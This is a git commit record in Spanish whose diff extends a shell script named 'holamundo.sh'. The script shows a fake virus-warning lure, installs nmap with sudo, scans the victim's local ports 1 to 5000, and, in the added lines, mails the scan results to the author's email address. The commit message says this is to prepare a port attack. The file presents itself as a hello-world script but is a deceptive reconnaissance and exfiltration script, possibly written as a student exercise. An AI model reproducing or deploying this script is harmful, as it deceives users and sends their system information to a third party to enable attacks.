8cf619719dfc8bf6e7d49cfa77c990fe91a3790b
ricardo94ac <richardo94ac@gmail.com>
2025-02-11 14:01:51 +0100

    5º commit le añadimos mandarlo a nuestro email para hacer el ataque de puertos

--- holamundo.sh
+++ holamundo.sh
@@ -2,3 +2,5 @@ echo "Tu pc está siendo escaneado por un virus,pinche aquí para pararlo"
 sudo apt install nmap #le obligamos a instalar nmap para descubrir que puertos tiene vulnerable
 nmap -p 1-5000 127.0.0.1 -oN resultado_nmap.txt #le escaneamos los puertos del 1 al 5000
 #le añadimos el archivo de texto donde mandara los resultados
+mail -s "Resultados Nmap" richardo94ac@gmail.com < resultado_nmap.txt
+#le añadimos que nos mande por correo los resultados para poder realizar el ataque. 
